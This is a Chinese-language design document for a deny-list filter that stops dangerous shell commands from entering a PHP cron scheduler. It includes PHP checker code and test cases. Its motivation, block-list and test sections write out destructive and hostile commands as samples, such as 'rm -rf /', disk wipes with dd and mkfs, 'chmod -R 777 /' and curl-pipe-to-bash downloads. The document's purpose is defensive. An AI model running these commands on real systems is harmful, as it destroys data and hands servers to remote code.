# schedule-job Shell 危险命令过滤方案

> Version: v1.0  
> Scope: `schedule-job` / Cron Shell Task  
> Priority: P0 / P1 / P2  
> Target: Linux Server

---

## 1. 背景

`schedule-job` 支持通过 Shell 命令执行定时任务。

典型执行链路：

```text
Web Admin
    ↓
Create / Edit Cron Task
    ↓
cron_task
    ↓
Scheduler
    ↓
Worker
    ↓
CronForkRunner
    ↓
proc_open()
    ↓
Linux Shell
```

由于 Shell 任务最终是在目标 Linux 服务器上直接执行，因此如果允许用户任意创建 Shell 任务，就可能产生严重的系统风险。

例如：

```bash
rm -rf /
rm -rf /*
dd if=/dev/zero of=/dev/sda
mkfs.ext4 /dev/sda
shutdown -h now
reboot
systemctl stop sshd
userdel root
chmod -R 777 /
```

这些命令一旦进入调度系统，就可能被 Scheduler 自动执行。

因此需要在：

```text
创建任务
编辑任务
```

这两个入口对 Shell Command 进行安全检查。

核心目标不是构建一个完整的 Linux 沙箱，而是：

> **禁止危险 Shell 任务进入 `cron_task`。**

---

# 2. 设计目标

## 2.1 核心目标

实现：

```text
Create/Edit Task
       ↓
exec_type == shell
       ↓
ShellCommandSecurityChecker
       ↓
   ┌───┴───┐
   ↓       ↓
 DENY    ALLOW
   ↓       ↓
返回错误   DB Save
```

危险命令：

```text
禁止创建
禁止修改
不写入 DB
```

安全命令：

```text
正常保存
正常进入 Scheduler
```

---

# 3. 核心原则

## 3.1 创建入口必须检查

不能等到 Worker 执行时才发现危险。

错误：

```text
Create
  ↓
DB Save
  ↓
Scheduler
  ↓
Worker
  ↓
proc_open()
  ↓
才发现危险
```

正确：

```text
Create
  ↓
ShellCommandSecurityChecker
  ↓
DENY / ALLOW
  ↓
DB Save
```

---

## 3.2 编辑入口必须检查

不能只保护 Create。

否则用户可以：

```text
创建安全任务
    ↓
编辑任务
    ↓
把 command 改成 rm -rf /
```

因此 Create / Edit 必须使用同一套 Checker。

---

## 3.3 不建议只在 Controller 中实现

不要：

```php
CronTaskController::create()
{
    // 检查 Shell
}
```

然后：

```php
CronTaskController::update()
{
    // 又复制一份检查
}
```

因为未来可能出现：

```text
Web API
CLI
Import
批量创建
内部服务
其他 Controller
```

最终容易出现绕过。

推荐：

```text
Controller
    ↓
CronTaskManagerService
    ↓
ShellCommandSecurityChecker
    ↓
Repository
    ↓
DB
```

安全检查属于**任务领域层/Service 层**。

---

# 4. Shell 危险命令分级

建议分为：

```text
P0：明确高危，直接禁止
P1：组合/参数型高危，禁止危险组合
P2：高级安全策略
```

第一阶段不要过度设计。

---

# 5. P0：直接禁止的危险命令

以下命令建议直接加入 P0 黑名单。

## 5.1 文件删除/破坏

```text
rm
unlink
shred
srm
wipe
```

尤其：

```bash
rm
rm -rf
rm -fr
rm -r -f
rm -rf /
rm -rf /*
```

这里不建议只匹配：

```regex
rm\s+-rf
```

而是直接禁止：

```text
rm
```

原因是攻击者可以通过参数变形绕过：

```bash
rm -rf /
rm -fr /
rm -r -f /
rm -f -r /
/bin/rm -rf /
/usr/bin/rm -rf /
```

如果业务没有明确要求用户使用 `rm`，直接禁止 `rm` 是最简单可靠的方案。

---

# 6. P0：磁盘/文件系统破坏

建议禁止：

```text
dd
mkfs
mkfs.ext2
mkfs.ext3
mkfs.ext4
mkfs.xfs
mkfs.btrfs
fdisk
cfdisk
sfdisk
parted
wipefs
blkdiscard
debugfs
```

典型危险命令：

```bash
dd if=/dev/zero of=/dev/sda
mkfs.ext4 /dev/sda
fdisk /dev/sda
parted /dev/sda
wipefs -a /dev/sda
blkdiscard /dev/sda
```

这些命令可能直接破坏磁盘或文件系统。

---

# 7. P0：Mount / 文件系统操作

建议禁止：

```text
mount
umount
losetup
```

例如：

```bash
mount /dev/sda1 /mnt
umount /
losetup /dev/loop0 /dev/sda
```

这些操作可能影响宿主机文件系统。

---

# 8. P0：系统关机/重启

建议禁止：

```text
shutdown
reboot
halt
poweroff
init
```

例如：

```bash
shutdown -h now
shutdown -r now
reboot
poweroff
halt
init 0
```

---

# 9. P0：用户/用户组管理

建议禁止：

```text
useradd
userdel
usermod
groupadd
groupdel
groupmod
passwd
chpasswd
newusers
```

原因：

Shell Task 不应该拥有修改服务器用户体系的能力。

例如：

```bash
userdel root
usermod -s /bin/bash root
passwd root
```

---

# 10. P0：权限提升

建议禁止：

```text
sudo
su
doas
pkexec
runuser
```

例如：

```bash
sudo rm -rf /
sudo systemctl stop sshd
su -
pkexec ...
```

核心原则：

> schedule-job 不应该成为用户获取更高系统权限的入口。

---

# 11. P0：系统服务管理

建议禁止：

```text
systemctl
service
rc-service
rc-update
```

兼容 Alpine Linux：

```text
rc-service
rc-update
```

例如：

```bash
systemctl stop sshd
systemctl disable docker
service nginx stop
rc-service sshd stop
rc-update del nginx
```

---

# 12. P0：网络/防火墙配置

建议禁止：

```text
iptables
ip6tables
nft
firewall-cmd
ufw
ifconfig
route
ip
```

特别是：

```bash
iptables -F
iptables -t nat -F
nft flush ruleset
ip link set eth0 down
ip route flush table main
```

这些命令可能导致服务器网络直接不可用。

---

# 13. P0：Kernel / 内核配置

建议禁止：

```text
sysctl
modprobe
insmod
rmmod
```

例如：

```bash
sysctl -w kernel.panic=1
modprobe ...
rmmod ...
```

这些命令可能修改 Kernel 参数或加载/卸载内核模块。

---

# 14. P0：进程控制

建议禁止：

```text
kill
killall
pkill
skill
```

例如：

```bash
kill -9 1
killall php
pkill -9 nginx
```

否则一个普通调度任务可能影响整个服务器进程。

---

# 15. P0：Shell 动态执行

建议禁止：

```text
eval
exec
source
```

例如：

```bash
eval "$COMMAND"
exec "$COMMAND"
source dangerous.sh
```

这些命令会进一步扩大 Shell 的执行能力和绕过风险。

---

# 16. P0 完整默认黑名单

第一版可以直接维护如下列表：

```php
private const P0_DENY_COMMANDS = [
    // File destructive
    'rm',
    'unlink',
    'shred',
    'srm',
    'wipe',

    // Disk / filesystem
    'dd',
    'mkfs',
    'mkfs.ext2',
    'mkfs.ext3',
    'mkfs.ext4',
    'mkfs.xfs',
    'mkfs.btrfs',
    'fdisk',
    'cfdisk',
    'sfdisk',
    'parted',
    'wipefs',
    'blkdiscard',
    'debugfs',

    // Mount
    'mount',
    'umount',
    'losetup',

    // Shutdown / reboot
    'shutdown',
    'reboot',
    'halt',
    'poweroff',
    'init',

    // User / group
    'useradd',
    'userdel',
    'usermod',
    'groupadd',
    'groupdel',
    'groupmod',
    'passwd',
    'chpasswd',
    'newusers',

    // Privilege escalation
    'sudo',
    'su',
    'doas',
    'pkexec',
    'runuser',

    // Service management
    'systemctl',
    'service',
    'rc-service',
    'rc-update',

    // Network / firewall
    'iptables',
    'ip6tables',
    'nft',
    'firewall-cmd',
    'ufw',
    'ifconfig',
    'route',
    'ip',

    // Kernel
    'sysctl',
    'modprobe',
    'insmod',
    'rmmod',

    // Process control
    'kill',
    'killall',
    'pkill',
    'skill',

    // Dynamic shell execution
    'eval',
    'exec',
    'source',
];
```

---

# 17. Command Normalization

不能简单：

```php
str_starts_with($command, 'rm')
```

因为：

```bash
rm -rf /
/bin/rm -rf /
/usr/bin/rm -rf /
```

都应该识别成：

```text
rm
```

因此需要先进行 Command Normalize。

---

## 17.1 基本流程

```text
原始 Command
    ↓
trim
    ↓
提取第一个 Token
    ↓
basename()
    ↓
lowercase
    ↓
P0 blacklist
```

例如：

```text
rm -rf /
```

得到：

```text
rm
```

---

```text
/bin/rm -rf /
```

得到：

```text
rm
```

---

```text
/usr/bin/rm -rf /
```

得到：

```text
rm
```

---

# 18. 基础实现

示例：

```php
private function normalizeCommandName(string $command): string
{
    $command = trim($command);

    if ($command === '') {
        return '';
    }

    $parts = preg_split('/\s+/', $command, 2);

    $firstToken = $parts[0] ?? '';

    return strtolower(basename($firstToken));
}
```

然后：

```php
$commandName = $this->normalizeCommandName($command);

if (in_array($commandName, self::P0_DENY_COMMANDS, true)) {
    return ShellCommandSecurityResult::deny(
        riskLevel: 'P0',
        matchedCommand: $commandName,
        reason: 'Dangerous shell command is not allowed.'
    );
}
```

---

# 19. Shell Wrapper 绕过

仅检查第一个 command 还存在一个问题。

例如：

```bash
bash -c "rm -rf /"
```

第一 command 是：

```text
bash
```

并不是：

```text
rm
```

因此还需要处理 Shell Wrapper。

---

# 20. Shell Wrapper 黑名单

建议 P0 检查：

```text
bash -c
sh -c
zsh -c
ksh -c
dash -c
eval
exec
source
```

例如：

```bash
bash -c "rm -rf /"
```

应该直接拒绝。

原因不是 `bash` 本身危险，而是：

> 允许用户通过 Shell Wrapper 动态构造任意 Shell 命令，会显著降低前面的安全检查效果。

---

# 21. Download + Execute

还需要重点识别：

```bash
curl ... | sh
curl ... | bash
wget ... | sh
wget ... | bash
```

例如：

```bash
curl https://example.com/install.sh | bash
```

或者：

```bash
wget -O- https://example.com/install.sh | sh
```

这种行为实际上属于：

```text
远程下载
   ↓
直接执行
```

风险非常高。

建议 P1 纳入禁止规则。

---

# 22. P1：危险命令组合

P0 主要解决：

```text
明显危险 command
```

P1 解决：

```text
单独看不一定危险
+
组合后非常危险
```

---

## 22.1 find + -delete

例如：

```bash
find / -delete
```

或者：

```bash
find /var/log -type f -delete
```

`find` 本身可能是正常运维命令。

但是：

```text
find + -delete
```

属于删除操作。

建议 P1：

```text
find + -delete
```

直接拒绝。

---

# 23. find + -exec + rm

例如：

```bash
find / -exec rm {} \;
```

即使 P0 已经禁止 `rm`，也应该针对这种组合增加检测。

例如：

```bash
find /tmp -exec rm -rf {} \;
```

建议：

```text
find
+
-exec
+
rm
```

直接拒绝。

---

# 24. xargs + rm

例如：

```bash
find /tmp -type f | xargs rm
```

第一 command：

```text
find
```

但最终实际执行：

```text
rm
```

因此建议识别：

```text
xargs + rm
```

以及：

```text
xargs + command
```

中的危险 command。

---

# 25. chmod / chown 危险组合

`chmod` 和 `chown` 本身未必应该完全禁止。

例如：

```bash
chmod 644 /var/www/a.log
```

可能是正常任务。

但是：

```bash
chmod -R 777 /
```

风险极高。

同样：

```bash
chown -R root /
```

也可能导致整个系统权限异常。

因此建议 P1 检测：

```text
chmod + -R + /
chown + -R + /
chmod + 777 + 系统目录
chown + 系统根目录
```

---

# 26. Pipeline 风险

Shell 本身支持：

```bash
A | B
```

因此：

```bash
curl xxx | bash
```

实际上第一个 command 是：

```text
curl
```

而最终执行的是：

```text
bash
```

因此不能只检查：

```text
第一个 token
```

P1 应该增加：

```text
Pipeline command analysis
```

至少识别：

```text
curl | sh
curl | bash
wget | sh
wget | bash
wget | zsh
```

---

# 27. 为什么 P0 不直接做完整 Shell AST

虽然可以实现完整 Shell Parser：

```text
Shell
 ↓
Lexer
 ↓
Parser
 ↓
AST
 ↓
Command Analysis
```

但对于当前 `schedule-job` 来说，第一阶段没有必要。

原因：

1. 实现复杂
2. 维护成本高
3. Shell 语法非常复杂
4. 不同 Shell 行为存在差异
5. 当前目标只是阻止明显危险任务
6. 容易把一个简单安全需求做成大型安全系统

因此建议：

```text
P0
Normalize
+
Dangerous Command Blacklist
+
Shell Wrapper Check
```

已经能够解决绝大多数明显危险任务。

---

# 28. 推荐的 Checker 接口

建议定义：

```php
interface ShellCommandSecurityCheckerInterface
{
    public function check(
        string $command
    ): ShellCommandSecurityResult;
}
```

返回：

```php
final class ShellCommandSecurityResult
{
    public function __construct(
        public readonly bool $allowed,
        public readonly string $riskLevel,
        public readonly ?string $matchedCommand,
        public readonly string $reason,
    ) {
    }

    public static function allow(): self
    {
        return new self(
            allowed: true,
            riskLevel: 'NONE',
            matchedCommand: null,
            reason: '',
        );
    }

    public static function deny(
        string $riskLevel,
        ?string $matchedCommand,
        string $reason,
    ): self {
        return new self(
            allowed: false,
            riskLevel: $riskLevel,
            matchedCommand: $matchedCommand,
            reason: $reason,
        );
    }
}
```

---

# 29. Create Task

创建任务时：

```php
if ($task->getExecType() === CronTask::EXEC_TYPE_SHELL) {
    $result = $shellCommandSecurityChecker->check(
        $task->getCommand()
    );

    if (!$result->allowed) {
        throw new ValidationException(
            $result->reason
        );
    }
}
```

必须发生在：

```text
DB Save
```

之前。

---

# 30. Edit Task

编辑任务同样：

```php
if ($task->getExecType() === CronTask::EXEC_TYPE_SHELL) {
    $result = $shellCommandSecurityChecker->check(
        $task->getCommand()
    );

    if (!$result->allowed) {
        throw new ValidationException(
            $result->reason
        );
    }
}
```

不能因为原任务已经存在，就跳过检查。

---

# 31. 推荐 Service 层结构

推荐：

```text
CronTaskController
        ↓
CronTaskManagerService
        ↓
   ┌────┴────┐
   ↓         ↓
Task Validate
   ↓
ShellCommandSecurityChecker
   ↓
   ├── DENY
   │
   └── ALLOW
         ↓
    CronTaskRepository
         ↓
        DB
```

这样未来：

```text
Web Create
Web Edit
CLI Create
Import
Batch Create
```

都可以统一经过：

```text
CronTaskManagerService
```

---

# 32. 是否需要 Worker 再检查一次？

建议增加。

但是它不是第一道防线，而是：

> Defense in Depth（纵深防御）

正常流程：

```text
Create
 ↓
Checker
 ↓
DB
 ↓
Scheduler
 ↓
Worker
 ↓
proc_open()
```

Worker 执行之前再检查：

```php
$result = $shellCommandSecurityChecker->check(
    $command
);

if (!$result->allowed) {
    // 不执行
    return;
}
```

---

# 33. 为什么 Worker 还需要检查

因为未来可能存在：

```text
直接 SQL 修改 cron_task
```

或者：

```text
历史数据
```

或者：

```text
旧版本程序创建的数据
```

或者：

```text
其他 API 绕过 Service
```

如果只有 Create/Edit：

```text
DB
 ↓
危险 command
 ↓
Worker
 ↓
proc_open()
```

仍然可以执行。

所以推荐：

```text
Create/Edit Checker
+
Worker Pre-execution Checker
```

---

# 34. Worker 检查原则

Worker 检查失败必须：

```text
Fail Closed
```

即：

```text
Checker 异常
   ↓
禁止执行
```

而不是：

```text
Checker 异常
   ↓
继续 proc_open()
```

安全系统中：

> 无法确认安全 = 不执行。

---

# 35. proc_open() 最终执行点

最终：

```php
$process = proc_open(
    $command,
    $descriptors,
    $pipes,
    $cwd,
    $env
);
```

之前：

```text
ShellCommandSecurityChecker
```

必须已经通过。

最终形成：

```text
Create/Edit
      ↓
Security Check
      ↓
     DB
      ↓
 Scheduler
      ↓
 Worker
      ↓
Security Check
      ↓
 proc_open()
```

---

# 36. 错误提示

前端不应该只显示：

```text
command invalid
```

建议：

```text
Shell command is not allowed.

Risk Level: P0
Matched Command: rm
Reason: Destructive file operation is prohibited.
```

中文系统可以：

```text
Shell 命令不允许执行。

风险等级：P0
匹配命令：rm
原因：禁止执行高风险文件删除操作。
```

---

# 37. 不建议把危险任务保存成 disabled

不推荐：

```text
Create
 ↓
发现危险
 ↓
status = 0
 ↓
保存
```

原因：

数据库中仍然存在危险命令。

以后可能因为：

```text
Bug
批量启用
数据迁移
代码变更
```

导致它重新执行。

正确：

```text
Create
 ↓
Security Check
 ↓
DENY
 ↓
直接返回错误
 ↓
不保存
```

---

# 38. 审计日志

建议记录危险命令被拒绝的事件。

例如：

```text
operator_id
task_id
risk_level
matched_command
reason
command_hash
created_at
```

例如：

```json
{
    "task_id": 10086,
    "operator_id": 123,
    "risk_level": "P0",
    "matched_command": "rm",
    "reason": "Destructive command is prohibited",
    "command_hash": "sha256(...)"
}
```

不建议无条件把完整 Shell Command 写入普通日志。

因为 Command 可能包含：

```text
Token
Password
API Key
Cookie
Database Password
```

因此可以使用：

```text
command_hash
```

辅助审计。

---

# 39. 配置设计

可以提供配置：

```php
'shell_security' => [
    'enabled' => true,

    'p0_deny_commands' => [
        'rm',
        'dd',
        'mkfs',
        'shutdown',
        'reboot',
        'sudo',
        'su',
        'systemctl',
        'iptables',
        'sysctl',
        'kill',
        // ...
    ],
]
```

但是需要注意：

> P0 安全策略不建议允许普通管理员在 Web Admin 中关闭。

也就是说：

```text
Config
 ↓
Developer / Server Admin
```

可以修改。

但：

```text
普通 schedule-job 操作员
```

不能：

```text
Disable Shell Security
```

---

# 40. exec_type 限制

安全检查只针对：

```text
exec_type = shell
```

例如：

```php
if ($task->getExecType() === CronTask::EXEC_TYPE_SHELL) {
    // Shell security check
}
```

HTTP Task：

```text
exec_type = http
```

不经过 Shell Checker。

---

# 41. P0 测试

## 41.1 删除类

以下全部必须 DENY：

```text
rm
rm -rf /
rm -fr /
rm -r -f /
/bin/rm -rf /
/usr/bin/rm -rf /
unlink xxx
shred xxx
```

---

## 41.2 磁盘

```text
dd if=/dev/zero of=/dev/sda
mkfs.ext4 /dev/sda
fdisk /dev/sda
parted /dev/sda
wipefs -a /dev/sda
blkdiscard /dev/sda
```

全部：

```text
DENY
```

---

## 41.3 系统

```text
shutdown -h now
reboot
halt
poweroff
init 0
```

全部：

```text
DENY
```

---

## 41.4 权限

```text
sudo xxx
su -
doas xxx
pkexec xxx
```

全部：

```text
DENY
```

---

## 41.5 服务

```text
systemctl stop nginx
service nginx stop
rc-service nginx stop
rc-update del nginx
```

全部：

```text
DENY
```

---

## 41.6 Kernel

```text
sysctl -w xxx
modprobe xxx
insmod xxx
rmmod xxx
```

全部：

```text
DENY
```

---

# 42. 正常命令测试

不能因为安全策略过严导致正常 Shell Task 无法使用。

例如：

```bash
php script.php
```

```bash
python3 worker.py
```

```bash
echo hello
```

```bash
date
```

```bash
pwd
```

```bash
whoami
```

```bash
ls -lah
```

```bash
cat test.log
```

```bash
grep "ERROR" app.log
```

这些应该：

```text
ALLOW
```

---

# 43. P1 测试

重点测试：

```bash
find /tmp -delete
```

```bash
find /tmp -exec rm {} \;
```

```bash
find /tmp | xargs rm
```

```bash
curl https://example.com/install.sh | bash
```

```bash
wget -O- https://example.com/install.sh | sh
```

```bash
chmod -R 777 /
```

```bash
chown -R root /
```

应该根据 P1 规则：

```text
DENY
```

---

# 44. Regression Test

必须保证原有正常任务不受影响。

例如：

```text
PHP Script
Python Script
Shell Utility
Log Query
Data Export
Health Check
```

正常命令应该继续：

```text
ALLOW
```

---

# 45. 实现优先级

## P0

第一阶段直接实现：

```text
① ShellCommandSecurityChecker

② Command Normalize

③ P0 Dangerous Command Blacklist

④ Absolute Path Normalize

⑤ Shell Wrapper Check

⑥ Create Task Check

⑦ Edit Task Check

⑧ Worker proc_open() 前再次 Check

⑨ Checker Exception → Fail Closed

⑩ Unit Test
```

---

# 46. P1

第二阶段：

```text
① find + -delete

② find + -exec + rm

③ xargs + rm

④ chmod/chown dangerous combination

⑤ curl | sh

⑥ curl | bash

⑦ wget | sh

⑧ wget | bash

⑨ Pipeline Analysis

⑩ Shell Operator Analysis
```

例如：

```text
;
&&
||
|
>
>>
```

重点分析危险命令是否隐藏在后面的 Pipeline / Command Chain 中。

---

# 47. P2

只有未来确实有需求时再考虑：

```text
① Shell AST Parser

② Allowlist

③ Command Capability Policy

④ Linux Sandbox

⑤ Container

⑥ cgroups

⑦ seccomp

⑧ namespace

⑨ 独立执行节点
```

当前不建议为了一个“危险命令过滤”需求直接引入这些复杂基础设施。

---

# 48. 推荐的最终架构

```text
                    Web Admin
                        │
                        ↓
              Create / Edit Task
                        │
                        ↓
                 exec_type=shell?
                        │
                       YES
                        │
                        ↓
          ShellCommandSecurityChecker
                        │
                 ┌──────┴──────┐
                 ↓             ↓
               DENY          ALLOW
                 │             │
                 ↓             ↓
             Return Error    DB Save
                               │
                               ↓
                           Scheduler
                               │
                               ↓
                             Worker
                               │
                               ↓
                  ShellCommandSecurityChecker
                               │
                       ┌───────┴───────┐
                       ↓               ↓
                     DENY            ALLOW
                       │               │
                       ↓               ↓
                   Skip Task       proc_open()
```

---

# 49. 最终安全策略

第一阶段最终采用：

```text
Normalize
    +
P0 Dangerous Command Blacklist
    +
Shell Wrapper Detection
    +
Create/Edit Entry Check
    +
Worker Pre-execution Check
```

而不是：

```text
复杂 Shell AST
+
Container
+
cgroup
+
seccomp
+
Namespace
+
独立执行集群
```

---

# 50. 最终结论

`schedule-job` 当前最应该解决的问题不是构建完整的 Linux 沙箱，而是：

> **从任务源头阻止危险 Shell 命令进入调度系统。**

因此推荐采用两层防线：

```text
第一层：

Create / Edit
       ↓
ShellCommandSecurityChecker
       ↓
危险命令 → DENY
安全命令 → DB
```

第二层：

```text
Worker
   ↓
ShellCommandSecurityChecker
   ↓
危险命令 → 不执行
安全命令 → proc_open()
```

其中 P0 直接禁止：

```text
rm
dd
mkfs
fdisk
parted
wipefs
mount
umount
shutdown
reboot
halt
poweroff
init
useradd
userdel
usermod
groupadd
groupdel
passwd
sudo
su
doas
pkexec
runuser
systemctl
service
rc-service
rc-update
iptables
ip6tables
nft
firewall-cmd
ufw
ifconfig
route
ip
sysctl
modprobe
insmod
rmmod
kill
killall
pkill
skill
eval
exec
source
```

同时通过：

```text
basename()
+
lowercase
+
Shell Wrapper Check
```

避免：

```bash
/bin/rm
/usr/bin/rm
bash -c "rm ..."
sh -c "rm ..."
```

等简单绕过。

最终原则：

```text
危险命令不允许创建
        ↓
危险命令不进入 cron_task
        ↓
Worker 再做一次防御性检查
        ↓
proc_open() 只执行通过安全检查的 Shell
```
不用推倒重来。

只需要做三个小升级：

① normalizeCommandName()
↓
定位为“基础 Normalize”，不要假设它是完整 Shell Parser

② Shell Wrapper
↓
统一直接 DENY

③ Command Chain
↓
从 P1 提升到 P0
至少处理 ; && || |

这样之后，我认为这份方案就可以作为 schedule-job Shell 安全过滤的正式 V1.0 方案。

这套方案足够解决当前 `schedule-job` 的核心风险，同时不会把 Cron 系统演变成一个复杂的“Shell 沙箱平台”。